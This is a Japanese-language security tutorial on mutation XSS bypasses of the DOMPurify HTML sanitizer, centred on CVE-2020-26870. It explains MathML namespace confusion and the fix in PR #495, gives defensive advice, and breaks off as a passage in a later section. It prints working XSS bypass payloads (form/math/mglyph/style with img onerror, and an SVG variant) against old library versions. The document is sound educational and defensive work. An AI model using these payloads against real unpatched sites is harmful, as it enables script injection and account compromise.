- From SVG and back — DOMPurify < 2.2.2 bypass（Daniel Santos、2020） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
- Exploring the DOMPurify library: Bypasses and Fixes（Kevin Mizu、2024） — https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Escaping '<' and '>' in attributes（Google Bug Hunters） — https://bughunters.google.com/blog/escaping-and-in-attributes-how-it-helps-protect-against-mutation-xss

## DOMPurifyバイパス：MathML名前空間混同（CVE-2020-26870）

このセクションでは、HTMLサニタイザー（入力HTMLから危険な要素・属性を除去して安全なHTMLに変換するライブラリ）のデファクトスタンダードである **DOMPurify** を、Michał Bentkowski（Securitum所属のセキュリティ研究者、Twitter/Xでは @SecurityMB）が2020年に破った手法を、原理のレベルまで掘り下げて解説する。この脆弱性は **CVE-2020-26870** として登録され、DOMPurify **2.0.17未満**の全バージョンが影響を受けた。

キーワードは3つある。**mutation XSS（mXSS）**、**名前空間混同（namespace confusion）**、そして **MathML**。これらが組み合わさると、「サニタイザーが検査した時点では完全に無害だったHTML」が、ブラウザに再びパース（構文解析）された瞬間に「実行可能なJavaScriptを含む危険なHTML」へと化ける。サニタイザーは自分が安全だと判定したものしか出力しないのに、その出力が後から勝手に変異（mutate）してしまうのだ。これがこの攻撃クラスの怖さであり、面白さでもある。

### 前提知識1：mutation XSS（mXSS）とは何か

**mutation XSS（変異型XSS、mXSS）**とは、「一度は安全と判定された（あるいは無害な形に整形された）HTML文字列が、ブラウザによって再解釈された際にDOMツリー（HTML要素の親子関係を表す木構造）が変化し、その結果として危険なコードが出現する」タイプのXSSである。2013年にMario Heiderichらの論文「mXSS attacks: attacking well-secured web-applications by using innerHTML mutations」で体系化された。

mXSSを理解する鍵は、次の事実である。

> **HTML文字列 → DOMツリー → HTML文字列、という往復（serialize-parse roundtrip、シリアライズ／再パースの往復）は、必ずしも元の文字列を返さない。**

普通に考えれば、「あるDOMツリーをHTML文字列に書き出し（シリアライズ、serialize：DOMを文字列表現に変換すること）、それをもう一度パースすれば、同じDOMツリーに戻る」はずである。しかしHTMLのパース規則は非常に複雑で、この往復が **べき等（idempotent、何度やっても結果が変わらない性質）ではない**ケースが多数存在する。サニタイザーが「DOMツリーAは安全だ」と判定してAを文字列に書き出しても、アプリケーションがその文字列を `innerHTML` に代入したときにブラウザが作るのは「別のDOMツリーB」かもしれない。Bに危険な要素が含まれていれば、サニタイズは実質的に無意味になる。

CVE-2020-26870のCVE公式説明文も、まさにこの点を突いている。

```
Cure53 DOMPurify before 2.0.17 allows mutation XSS. This occurs because
a serialize-parse roundtrip does not necessarily return the original DOM
tree, and a namespace can change from HTML to MathML, as demonstrated by
nesting of FORM elements.
```

（訳：DOMPurify 2.0.17未満はmutation XSSを許す。これは、シリアライズ／再パースの往復が必ずしも元のDOMツリーを返さず、FORM要素のネストによって実証されるように、名前空間がHTMLからMathMLへ変化しうるために起こる。）

> 出典: CVE-2020-26870（NVD）、CVSS 3.1: 6.1（MEDIUM）、公開日: 2020年10月7日

### 前提知識2：DOMPurifyはなぜ「2回パース」するのか

なぜ「往復」が起きるのかを理解するには、DOMPurifyの動作原理を知る必要がある。DOMPurifyは概ね次の手順で動く。

1. アプリケーションから、信頼できないHTML文字列（例: ユーザーが投稿したコメント）を受け取る。
2. その文字列を **一度パースしてDOMツリーを作る**（内部的には `DOMParser` や、`<template>`要素の `innerHTML` などを利用）。—— これが **1回目のパース**。
3. できたDOMツリーを走査し、許可リスト（allow-list）に載っていない要素（例: `<script>`）や属性（例: `onerror`）を **削除**する。残った要素は「安全」とみなす。
4. サニタイズ済みのDOMツリーを再び **HTML文字列にシリアライズ**して呼び出し元に返す（`innerHTML` を読み出す等）。
5. アプリケーションはその文字列を、たとえば `element.innerHTML = purified` のように **DOMへ挿入する**。—— ここでブラウザによる **2回目のパース**が発生する。

つまりDOMPurifyが「安全だ」と判断するのはステップ3の**1回目のパース結果**に対してだが、実際に画面に反映されるのはステップ5の**2回目のパース結果**である。この2つが食い違えば、mXSSが成立する。攻撃者のゴールは、「1回目のパースでは無害に見えるが、2回目のパースで危険物が出現する」ような入力を作り込むことだ。

なお、DOMPurifyの後の修正（PR #495）では、この「文書パースモード（document parsing）とフラグメントパースモード（fragment parsing）の差異」による再パースの揺れをさらに減らすため、`insertAdjacentHTML` への依存を完全に廃止し、可能な限りDOMノードを直接操作するように変更されている（詳細は後述の修正パート）。

### 前提知識3：HTMLの3つの名前空間と「統合ポイント」

この攻撃の心臓部が **名前空間（namespace）**である。モダンなHTMLパーサは、1つのHTML文書の中で3種類の言語を扱い分けている。

- **HTML名前空間**（`http://www.w3.org/1999/xhtml`）: 通常のHTML要素。
- **SVG名前空間**（`http://www.w3.org/2000/svg`）: ベクタ画像用の要素。`<svg>` 要素をトリガーに切り替わる。
- **MathML名前空間**（`http://www.w3.org/1998/Math/MathML`）: 数式表現用の要素。`<math>` 要素をトリガーに切り替わる。

同じ要素名でも、**どの名前空間に属するかによってパース規則も振る舞いも変わる**。特に重要なのが `<style>` 要素の挙動の違いである。

- **HTML名前空間の `<style>`**: 「raw text要素（生テキスト要素）」として扱われ、`</style>` が現れるまでの中身は**すべてただのテキスト（CSS）として読まれる**。つまり `<style><img src=x onerror=alert(1)></style>` と書いても、この `<img>` は要素ではなく**文字列**であり、何も起きない。
- **SVG／MathML名前空間の `<style>`**: 外来（foreign）要素として扱われ、中身は **通常のマークアップとしてパースされる**。つまり同じ `<style><img ...></style>` でも、内側の `<img>` は**本物の要素**として木に組み込まれる。

この「`<style>`の中身がテキストなのか要素なのか」という差が、後で決定打になる。

#### 統合ポイント（integration point）とmglyph/malignmarkの特殊性

MathMLやSVGの領域の中に、「ここから先はまたHTMLとして解釈してよい」という橋渡し地点がある。これを **統合ポイント（integration point）**と呼ぶ。

- **MathMLテキスト統合ポイント（MathML text integration point）**: `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の5要素。これらの**子として現れるタグは、原則HTML名前空間として解釈される**（＝MathMLの世界からHTMLの世界へ抜け出せる）。
- **HTML統合ポイント（HTML integration point）**: MathMLの `<annotation-xml>`（一定の条件下）や、SVGの `<foreignObject>`, `<desc>`, `<title>` など。

ところが、この「MathMLテキスト統合ポイントの子はHTMLになる」というルールには **2つの例外**がある。それが本脆弱性の主役、**`<mglyph>` と `<malignmark>`** である。

> HTML仕様の外来コンテンツ（foreign content）に関する規則では、`<mglyph>` と `<malignmark>` は、**MathMLテキスト統合ポイントの「直接の子」である場合に限り、HTMLではなくMathML名前空間のまま**留まる。他のすべてのタグはHTMLに抜け出すのに、この2つだけはMathMLに残る。

「直接の子であるかどうか」で名前空間が変わる—— この一文が攻撃の全てを決める。もし攻撃者が「初回パースでは `<mglyph>` を統合ポイントの**直接の子ではない**位置に、再パースでは**直接の子**になる位置に」動かせれば、`<mglyph>` の名前空間をHTML→MathMLへ「変異」させられる。

> 出典: HTML Standard（tree construction / foreign content の規則）、および DOMPurify Wiki: Attack Classes & Bypass History — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

### 前提知識4：ネストした`<form>`という「所有権変異ガジェット」

最後の部品が **`<form>`要素のネスト（入れ子）に関するHTMLパーサの癖**である。

HTMLパーサは内部に **form element pointer（フォーム要素ポインタ）**という状態を持つ。`<form>` の開始タグを見つけると、パーサは「今このフォームの中にいる」という印としてこのポインタをセットする。そして**すでにフォームが開いている状態で新たな `<form>` に出会うと、2つ目の `<form>` は無視され、要素として作られない**（HTMLではフォームを入れ子にできないため）。

ところが——この「フォームは入れ子にできない」ルールの適用のされ方が、**通常のHTMLコンテキストと、MathML/SVGの外来コンテンツの中とで異なる**。外来コンテンツのパース中には、form element pointerのチェックが通常どおり働かず、**一時的にネストした`<form>`が作られてしまう**瞬間がある。これが本攻撃の「所有権変異ガジェット（ownership mutation gadget）」——ある要素の「親（＝所有者）」を初回パースと再パースの間ですり替える仕掛け——として機能する。

要するに：**初回パースでは幻の2つ目の `<form>` が存在し、`<mglyph>` の親になる。しかし再パースでは、DOMPurifyがシリアライズし直した文字列を素直にパースする過程でその2つ目の `<form>` が消え、`<mglyph>` の親が `<mtext>` に繰り上がる。** 親が変われば、前述の「mglyphは統合ポイントの直接の子ならMathMLに残る」ルールが発動し、名前空間が切り替わる。

### 攻撃の全体像：ペイロードとステップバイステップ

これらの部品が揃ったところで、Bentkowskiのペイロード本体を見よう。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

一見すると、`<form>` が2つあり、閉じタグの位置がめちゃくちゃで、`<img>` はどう見ても `<style>` の内側にある「壊れたHTML」である。だが、この「壊れ方」こそが計算され尽くしている。なぜこれが動くのか。**初回パース（DOMPurifyが見る木）**と**再パース（ブラウザが最終的に作る木）**を分けて追う。

#### ステップA：初回パース（DOMPurifyが検査する、無害に見える木）

DOMPurifyがこの文字列を最初にパースすると、外来コンテンツ内のネスト`<form>`の癖により、おおよそ次のような構造ができる。

```
form (HTML名前空間)
└─ math (MathML名前空間)
   └─ mtext (MathMLテキスト統合ポイント)
      └─ form (2つ目の form ← 外来コンテンツの癖で「一時的に」出現)
         └─ mglyph (★HTML名前空間★ ← 統合ポイントの「直接の子」ではなく、間にformが挟まっているため)
            └─ style (HTML名前空間 ← 親のmglyphがHTMLなので)
               └─ "(テキスト)</math><img src onerror=alert(1)>"
```

ここでの決定的なポイントは2つ。

1. **`<mglyph>` はHTML名前空間にいる。** なぜなら、`<mtext>`（統合ポイント）の**直接の子ではなく**、間に2つ目の `<form>` が挟まっているからだ。「直接の子でなければ例外は発動しない」ので、mglyphはごく普通のHTML要素扱いになる。
2. **`<style>` もHTML名前空間にいる。** 親のmglyphがHTMLだから。前述のとおりHTMLの `<style>` は raw text要素なので、その後ろに続く `</math><img src onerror=alert(1)>` は**すべて「styleの中身のテキスト文字列」として飲み込まれる**。この文字列内には `</style>` が無いので、`<img>` が独立した要素になることは決してない。

結果、DOMPurifyの目に映るのは「form / math / mtext / form / mglyph / style（中身はただのテキスト）」という、**すべて許可リストに載った無害な要素だけの木**である。`<img>` という要素も、`onerror` という属性も、DOMツリー上には**存在しない**（テキストの一部でしかない）。だからDOMPurifyは何も削除するものを見つけられず、この木をそのまま「安全」と判定してシリアライズし、呼び出し元に返す。

> **なぜ動くのか（ステップAの一文解説）**: `onerror` を含む文字列が、独立した `<img>` 要素の属性ではなく `<style>` の生テキストの一部になっているため、サニタイザーには「除去すべき危険な属性」が一切見えない。危険物は「テキストに変装」して検問を通過する。

#### ステップB：再パース（ブラウザが実際に作る、危険な木）

DOMPurifyが返した文字列を、アプリケーションが `innerHTML` に代入すると、ブラウザが**2回目のパース**を行う。ここで木が「変異」する。DOMPurify Wiki の記述を借りれば、変化は次のとおり。

> On reparsing, the second HTML form is not created and mglyph becomes a direct child of mtext, placing it in the MathML namespace. Because of that, style is also in MathML namespace, hence its content is not treated as text. The `</math>` tag closes the math element, and now the img element is created in HTML namespace, leading to XSS.
>
> （再パース時には2つ目のHTML formは作られず、mglyphがmtextの直接の子になり、MathML名前空間に置かれる。そのためstyleもMathML名前空間になり、その中身はテキストとして扱われない。`</math>` タグがmath要素を閉じ、img要素がHTML名前空間で作られ、XSSに至る。）

再パース後の木は概ねこうなる。

```
form (HTML名前空間)
└─ math (MathML名前空間)
   └─ mtext (MathMLテキスト統合ポイント)
      └─ mglyph (★今度はMathML名前空間★ ← mtextの「直接の子」になったので例外が発動)
         └─ style (★MathML名前空間★ ← 親がMathMLになったので外来要素扱い)
            └─ (中身は「テキスト」ではなく「マークアップ」としてパースされる)
img (HTML名前空間・onerror付き) ← </math> でmathを閉じた後、HTMLに戻って本物のimg要素に!
```

連鎖を分解すると：

1. 2つ目の `<form>` が**消える**（form element pointerのルールで、素直なパースでは入れ子formが作られない）。
2. その結果 `<mglyph>` の親が `<mtext>` に繰り上がり、**統合ポイントの直接の子**になる。
3. mglyph/malignmark例外が発動し、`<mglyph>` は **MathML名前空間**に入る。
4. 子の `<style>` も**MathML名前空間**になる。MathMLの `<style>` は外来要素なので、中身は**マークアップとしてパースされる**（もう「テキスト」ではない）。
5. その中身にある `</math>` が、いま**本当にmath要素を閉じる**。パーサはMathMLの世界から抜け、**HTML名前空間に戻る**。
6. 続く `<img src onerror=alert(1)>` が、**HTML名前空間の本物の `<img>` 要素**として生成される。`onerror` は生きたイベントハンドラだ。
7. `src` が空（または不正）なので画像読み込みが失敗し、`onerror` が発火して `alert(1)` が実行される —— **XSS成立**。

> **なぜ動くのか（ステップBの一文解説）**: `<style>` の名前空間がHTML→MathMLへ「変異」した瞬間に、その内側が「テキスト」から「要素」へと解釈が切り替わり、テキストに変装していた `<img onerror>` が本物の要素として"解凍"される。DOMPurifyは変異前の木しか見ていないので、この解凍を防げない。

同じバイト列 `<img src onerror=alert(1)>` が、初回パースでは「styleの生テキスト」、再パースでは「実行可能なimg要素」——文脈（名前空間）が違えば同じ文字列が別物になる、という**名前空間混同（namespace confusion）**の本質がここに凝縮されている。

なお `src` の書き方には流派があり、`<img src onerror=alert(1)>`（src空）でも `<img src=x onerror=alert(1)>`（存在しないパス）でもよい。いずれも「画像の読み込みに失敗させて `onerror` を発火させる」という同じ目的で、XSSの定番テクニックである。

### この攻撃が示す一般原理：なぜサニタイザーは名前空間に弱いのか

この一件から学ぶべき最重要の教訓は次の点だ。

> **「タグ名（ローカル名）だけを見て安全性を判断してはいけない。要素が実際にどの名前空間にいるかを見なければならない。」**

DOMPurify 2.0.17以前は、要素を「タグ名」ベースの許可リストで判定していた。`mglyph` は許可リストに入っている（MathMLの正当な要素だから）。しかし、**HTML名前空間にいる `mglyph`** は、本来この世に存在してはいけない異常な要素である（mglyphはMathML専用の名前だから）。初回パースでたまたまHTML名前空間の `mglyph` が生まれても、旧DOMPurifyは「mglyphは許可リストにあるからOK」と通してしまった。この「名前空間の取り違え」を見逃したことが、変異の余地を残した。

より一般化すると、mXSSの温床は次の3条件が揃うときだ。

1. サニタイザーが **serialize→parse の往復**を（明示的または暗黙に）行う。
2. HTMLパースに **往復でべき等でない**箇所がある（名前空間の切り替え、`<style>`/`<textarea>`/`<title>`等のraw text要素、コメント、属性のエスケープ差など）。
3. サニタイザーが **1回目のパース結果**を検査し、実行されるのは**2回目のパース結果**である。

名前空間混同は、この(2)の中でも特に強力なガジェットである。なぜなら、要素の名前空間はDOMツリー上の**親子関係**から動的に決まり、その親子関係は「ネストformの癖」のようなパーサの細かな挙動で往復のたびに変わりうるからだ。

### CVE-2020-26870：バージョン・タイムライン・影響

バージョン依存の攻撃なので、対象と修正状況を明記しておく（陳腐化への注意）。

| 項目 | 内容 |
|---|---|
| CVE番号 | **CVE-2020-26870** |
| 対象製品 | Cure53 **DOMPurify** |
| 影響バージョン | **2.0.17 未満**のすべて |
| 修正バージョン | **2.0.17** |
| CVE公開日 | 2020年10月7日 |
| CVSS 3.1 基本値 | **6.1（MEDIUM）** |
| 発見・報告者 | **Michał Bentkowski**（Securitum） |
| 攻撃前提 | サニタイズ結果が `innerHTML` 等でDOMに挿入され、MathML/SVGを含む外来コンテンツがサニタイズ対象に含まれること（DOMPurifyの既定はHTML/MathML/SVGを全てサニタイズ対象とする） |

CVSSが「6.1 / MEDIUM」なのは、XSS一般と同様に「利用者の操作（被害者が細工されたコンテンツを含むページを閲覧すること、UI:R）」を要し、また影響が機密性・完全性への部分的影響（C:L/I:L）にとどまる評価がなされているためである。ただし実際にはセッション乗っ取りやアカウント侵害に直結しうるので、実務上のインパクトは軽視できない。

**重要な陳腐化の注意**: この個別のペイロード（form/math/mglyph/style）は 2.0.17（2020年）で修正済みであり、現行のDOMPurify（3.x系）では動作しない。学習の目的は「このペイロードを撃つこと」ではなく、**名前空間混同という攻撃クラスの原理を理解すること**にある。実際、同じ原理の別バリアントがその後も繰り返し発見されており（後述）、この攻撃クラス自体は今も生きている。

### 修正：`_checkValidNamespace` と Pull Request #495

Bentkowskiは脆弱性を報告するだけでなく、修正案そのものも提示した。それが DOMPurify の **Pull Request #495「Harden protection against mutation XSS caused by namespace switching」**（作者 securityMB＝Bentkowski本人、2020年12月17日マージ）である。中核は新設された **`_checkValidNamespace`** 関数で、**各ノードを「親の名前空間」に照らして検証し、仕様上ありえない名前空間の切り替えを検出したらそのノードを削除する**というものだ。

`_checkValidNamespace` が強制する5つの検証ルール（PR #495より）：

1. **SVGからHTMLへの名前空間切り替え**は、`<svg>` タグを経由する場合にのみ許可される。
2. **MathMLからHTMLへの名前空間切り替え**は、`<math>` タグを経由する場合にのみ許可される。
3. **HTMLから外来コンテンツへの切り替え**は、指定された統合ポイント（MathMLテキスト統合ポイントやHTML統合ポイント）においてのみ許可される。
4. **SVG／MathML固有の要素**が、HTML名前空間に出現することは許可されない。誤配置された要素は**削除**される。
5. 逆に、**SVG/MathML名前空間にのみ属すべきHTML要素**が誤った名前空間に配置されている場合も**削除**される。

このルール4こそが、まさに本攻撃を無力化する。初回パースで生まれた「**HTML名前空間の `mglyph`**」は、ルール4に照らすと「HTML名前空間に存在するMathML固有要素」という不正な状態なので、DOMPurifyがサニタイズ段階で**削除**する。危険物を"解凍"するための足場（mglyph→style）がそもそも取り除かれるため、再パースしても何も起きない。

PR #495はさらに、mXSSの温床を減らすための周辺強化も行った。

- **`insertAdjacentHTML` への依存の廃止**: 文書パースモード（document parsing）とフラグメントパースモード（fragment parsing）の差に起因する再パースの揺れを防ぐため、DOMノードを直接扱う方式に変更。これによりserialize-reparseの不一致が生じる余地を削減した。
- **DOM clobbering（DOMクロバリング：`id`/`name`属性でDOMプロパティを上書きしてスクリプトの前提を崩す攻撃）対策**の強化。キャッシュされた、realm安全なアクセサを用いてDOMクロバリングを防止。

> 出典: Harden protection against mutation XSS caused by namespace switching (PR #495) — https://github.com/cure53/DOMPurify/pull/495

なお、DOMPurify Wikiではセキュリティゴールとして、`RETURN_DOM_FRAGMENT: true` を使えばserialize-reparseの過程自体をスキップできるため、mXSSの懸念を根本から回避できることも明記されている。

### 防御策：アプリ側・ライブラリ側でできること

実務者として押さえるべき防御を整理する。

1. **DOMPurifyを最新に保つ**。名前空間混同は一度きりの脆弱性ではなく、次々と新種が見つかる「クラス」である。2.0.17（本CVE）、2.2.2（後述のSVG版）など、修正のたびにバージョンを上げること。バージョン固定（ピン留め）したまま放置するのが最も危険。
2. **不要な外来コンテンツを許可しない**。多くのWebアプリはユーザー入力にMathMLやSVGを本当に必要とはしていない。DOMPurifyの設定で `USE_PROFILES: { html: true }` のようにHTMLのみを許可し、MathML/SVGを対象から外せば、名前空間混同の攻撃面（attack surface）を根本から縮小できる。
3. **可能なら「サニタイズしてから即挿入」以外の設計を検討する**。信頼できないHTMLをそもそもレンダリングしない、テキストとして扱う（`textContent` を使う）、あるいはサーバ側での厳格な検証と組み合わせる、など多層防御にする。
4. **CSP（Content Security Policy）を併用する**。万一サニタイズをすり抜けても、`script-src` を厳格にし、インラインイベントハンドラ（`onerror` 等）を禁止していれば、`onerror=alert(1)` の発火自体をブロックできる可能性がある。ただしCSPはサニタイザーの代替ではなく、最後の砦としての併用が原則。
5. **サニタイザーを自作しない**。名前空間混同やmXSSは、HTMLパーサの深い挙動を知らなければ防げない。DOMPurifyのような、専門家が継続的にバイパスと修正を繰り返してきた実績あるライブラリを使うこと。

### この攻撃クラスの系譜：名前空間混同は繰り返す

Bentkowskiの2.0.17バイパスは孤立した事件ではない。**名前空間混同によるmXSS**は、DOMPurifyの歴史の中で繰り返し現れる主要な攻撃クラスであり、本セクションの技術的価値の核心もそこにある。代表的な系譜を挙げる。

- **2019年（SVG版・DOMPurify < 2.0.x）**: PR #495にも記録されている、SVGを起点とするmXSS。
  ```html
  <svg></p><style><a title="</style><img src onerror=alert(1)>">
  ```
  HTMLの `<p>` がSVG要素の子として出現（仕様違反）。シリアライズ後に再パースされると、外来コンテンツの規則により要素の名前空間が変化し、`<img>` がHTML名前空間で実体化する。原理は本CVEと同型（名前空間の境界と `<style>` のraw text挙動の悪用）。

- **2020年（MathML版・CVE-2020-26870・DOMPurify < 2.0.17）**: 本セクションのBentkowskiの手法。form/math/mtext/mglyph/style。MathMLテキスト統合ポイントを悪用し、HTML `<mglyph>` が不正にHTML名前空間に出現、再パースでMathML名前空間にシフトしてXSSに至る。

- **2020年以降（SVG版・DOMPurify < 2.2.2）**: Daniel Santos（vovohelo）による「From SVG and back, yet another mutation XSS via namespace confusion」。「SVGへ入って、また戻る」ことで名前空間を混同させる別角度のバイパス。`_checkValidNamespace` 導入後も、なお抜け道が残っていたことを示した。

これらに共通する防御原則は、PR #495以降DOMPurifyが確立した次の一文に集約される。

> **「サニタイザーは、ローカルなタグ名だけでなく、要素が実際に属する名前空間で評価しなければならない。」**

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

### 参考：Michał Bentkowski の関連研究

Bentkowskiは2013年よりSecuritumに所属し、Webおよびモバイルアプリのセキュリティ診断・研究・トレーニングに従事している。DOMPurifyやサニタイザーバイパス、プロトタイプ汚染に関心があれば、いずれも一級の教材である。

- **Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass**（本セクションの主題、2020年） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
- **DOMPurify 2.0.0 bypass using mutation XSS**（別のmXSSによる初期のDOMPurifyバイパス）
- **Prototype pollution and bypassing client-side HTML sanitizers**（プロトタイプ汚染〔JavaScriptのプロトタイプチェーンを汚染して既定挙動を書き換える攻撃〕を使い、DOMPurifyを含むクライアント側サニタイザーを破る研究。半自動的な悪用手法の探索も含む）
- **HTML sanitization bypass in Ruby Sanitize < 5.2.1**（Ruby製サニタイザーSanitizeのRELAXED構成を完全にバイパス、2020年）
- **XSS in GMail's AMP4Email via DOM Clobbering**（DOMクロバリングによるGmail AMP4EmailのXSS、Google VRP報告、2019年）
- **Exploiting prototype pollution for RCE in Kibana (CVE-2019-7609)**（プロトタイプ汚染からのリモートコード実行）

講演「A word about DOMPurify bypasses a.k.a why DOM parsing is crazy（DOMPurifyバイパスの話、あるいはなぜDOMパースは狂っているのか）」は、本セクションのテーマそのものを扱っており必見である。

> 出典: Michał Bentkowski 研究インデックス — https://www.bentkowski.info/research/
> 出典: Michał Bentkowski（Securitum 著者ページ） — https://research.securitum.com/authors/michal-bentkowski/

### まとめ

- **CVE-2020-26870**は、DOMPurify < 2.0.17に対する **mutation XSS（mXSS）**であり、その手口は **MathMLの名前空間混同**だった。
- 攻撃の骨格は「**同じ文字列が、初回パースと再パースで別の名前空間に置かれ、`<style>` の中身が『テキスト』から『要素』へ化ける**」こと。ネストした `<form>` を「所有権変異ガジェット」に使い、`<mglyph>` の親を `mtext` に繰り上げることで、mglyph→styleの名前空間をHTML→MathMLへ変異させ、隠していた `<img onerror>` を再パース時に解凍する。
- ペイロード: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`。
- 修正は **`_checkValidNamespace`（PR #495、2020年12月17日マージ）**で、「各ノードを親の名前空間に照らして検証し、HTML名前空間の `mglyph` のような仕様違反要素を削除する」ことにより、変異の足場を除去した。`insertAdjacentHTML` への依存廃止も同時に行われ、serialize-reparseの不一致リスクを低減した。
- 教訓は普遍的で、**サニタイザーはタグ名ではなく実際の名前空間で判断すべし**。そして名前空間混同は一度で終わらず、SVG版・MathML版と形を変えて繰り返し現れる「クラス」であるため、**ライブラリを最新に保ち、不要な外来コンテンツを許可しない**ことが実務上の要である。

## 変異XSSによるDOMPurify再バイパス

このセクションでは、HTMLサニタイザのデファクトスタンダードである **DOMPurify** に対して、**変異XSS（mutation XSS, mXSS）** を使って繰り返しバイパスが成立してきた歴史を、仕組みのレベルで解説する。特に次の2本の研究を中心に扱う。

1. Gareth Heyes による「Bypassing DOMPurify again with mutation XSS」（PortSwigger Research, 2020年10月7日公開。DOMPurify < 2.1 に対する再バイパス）
2. Daniel Santos（@bananabr）による DOMPurify < 2.2.2 バイパス（GitHub Issue #482, 2020年11月2日報告）

いずれも「一度サニタイズを通過した無害に見えるHTMLが、ブラウザに再解釈された瞬間に危険なHTMLへ**変異（mutation）**する」という、反射型の素朴なXSSとは根本的に発想の異なる攻撃である。ここを理解すると、「なぜ文字列レベルのフィルタや正規表現によるサニタイズが原理的に脆弱なのか」「なぜDOMベースのサニタイザですら破られるのか」が腑に落ちるはずだ。

---

### 前提: このセクションを読む前に押さえておくこと

#### 変異XSS（mXSS）とは何か

**変異XSS（mutation XSS, mXSS）**とは、「サニタイズ処理を行った時点では安全だった文字列が、ブラウザ（正確にはHTMLパーサ）に読み込まれて実際のDOMツリー（ブラウザ内部でHTMLを表現する木構造のデータ）を組み立てる過程で、**別の（危険な）構造へ勝手に書き換わってしまう**」ことを利用する攻撃である。「変異（mutation）」という名前は、まさにこの「入力文字列が解釈の途中で姿を変える」現象に由来する。

素朴な反射型XSSが「`<script>`という文字列をそのまま埋め込めるか？」を問うのに対し、mXSSは「サニタイザが見ているDOMと、最終的にブラウザが作るDOMが**一致しない**」という食い違い（不整合, discrepancy）そのものを突く。したがって、サニタイザがどれほど厳密に「今見えているDOM」を検査しても、検査後に構造が変わってしまえば意味がない。

#### DOMPurifyの動作モデルと「2回パースされる」という宿命

DOMPurifyの典型的な処理フローは次のとおりである。

1. **1回目のパース**: 受け取ったHTML文字列を、ブラウザのパーサ（`DOMParser`や`template`要素などを利用）で一度DOMツリーに変換する。
2. **サニタイズ（危険なノードの除去）**: できあがったDOMツリーを上から下まで走査（トラバース）し、許可リスト（allow-list, 安全と認められたタグ・属性だけを通す方式）に載っていない要素・属性を削除する。
3. **再シリアライズ（serialize, DOMを文字列HTMLへ戻す処理）**: 掃除の終わったDOMツリーを、`innerHTML`などで取り出せるHTML文字列に戻す。
4. **2回目のパース**: そのサニタイズ済み文字列を、開発者が最終的に `element.innerHTML = purified` のようにページへ挿入すると、**ブラウザがもう一度パースして**本物のDOMを作る。

問題の核心はこの構造にある。**DOMPurifyが検査するのは「1回目のパース」で得たDOMなのに、実際にページに現れて動くのは「2回目のパース」で得たDOM**である。もしこの2回のパースが同じ文字列から**異なる木**を作るなら、1回目では無害だったものが2回目で牙をむく。mXSSとは、この「1回目 ≠ 2回目」を意図的に作り出す技術に他ならない。

> sink（ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`, `outerHTML`, `document.write`）に、サニタイズ済みの文字列を渡した瞬間が「2回目のパース」に相当する。

#### なぜ `<style>`・コメント・属性値が鍵になるのか（パーサの再解釈）

mXSSペイロードには、`<style>`、HTMLコメント（`<!-- -->`）、CDATAセクション（`<![CDATA[ ]]>`）、そして**属性値**が頻出する。これは偶然ではなく、いずれも「**文脈（コンテキスト）によって中身の扱いが変わる**」HTMLパーサの性質を突いているためである。中でも決定的なのは次の2点だ。

- **`<style>`・`<title>`・`<textarea>`などは「raw text要素」**: HTML名前空間においては、これらのタグの中身は「タグではなくただのテキスト」として扱われる。つまり `<style><img src=x onerror=alert(1)></style>` の `<img>` は、HTML文脈では**要素ではなく文字列**であり、`onerror`は発火しない。DOMPurifyもこれを「無害なテキスト」と見なして削除しない。**ところが同じ`<style>`が外部名前空間（SVG/MathML）に置かれると raw text ではなくなり、中身が通常のマークアップとして解析され、`<img>`が本物の要素になる**。この「同じタグなのに名前空間で挙動が変わる」ギャップが、mXSSの主戦場である。

- **属性値のシリアライズは `<` `>` `/` をエスケープしない**: DOMがHTML文字列へ戻される（シリアライズされる）とき、属性値の中では `&` や `"` はエスケープされるが、`<`・`>`・`/` は**そのまま**出力される。したがって、ある属性の値が文字列として `</style><img onerror=alert(1)>` を含んでいると、シリアライズ後の文字列にはこの `</style>` がそっくりそのまま現れる。次に `<style>` が「raw text要素」として解釈される文脈で再パースされると、パーサは raw text を読み進める途中でこの `</style>` に到達してそこで`<style>`を閉じてしまい、続く `<img onerror=...>` を**本物のタグ**として解析する。これが典型的な変異である。

この2つを組み合わせると、「サニタイザから見れば、危険なコードは属性値の中に閉じ込められた無害な文字列。しかし再パース時には`<style>`が閉じられて属性の外へ飛び出し、実行可能な要素になる」という、まさに文字列が変異する状況を作れる。

---

### 名前空間（namespace）とintegration pointの基礎

DOMPurifyのmXSSバイパスは、ほぼ例外なく**名前空間の切り替え**を悪用する。ここが本セクション最大の山場なので、丁寧に積み上げる。

#### HTML / SVG / MathML の3つの名前空間と foreign content

ブラウザのHTMLパーサは、1つの文書の中に**3種類の名前空間**の要素を作り分ける。

- **HTML名前空間**（`http://www.w3.org/1999/xhtml`）: 普通の`<div>`や`<img>`など。
- **SVG名前空間**（`http://www.w3.org/2000/svg`）: `<svg>`要素以下。
- **MathML名前空間**（`http://www.w3.org/1998/Math/MathML`）: `<math>`要素以下。

パーサは通常HTML名前空間で動いているが、`<svg>` または `<math>` に出会うと、そこから先を **foreign content（外部コンテンツ）** として扱い、それぞれSVG/MathML名前空間へ切り替える。foreign contentの中では、HTMLとは**異なる解析規則**が適用される。前述の「`<style>`が raw text 要素でなくなる」のもこの規則差の一例である。

#### text integration point と HTML integration point

foreign content一色になると、その中にHTMLを書けなくなってしまい不便である。そこで仕様には、**外部名前空間の中に「ここから先はHTMLとして解析してよい」という穴**が用意されている。これが **integration point（統合点）** だ。2種類ある。

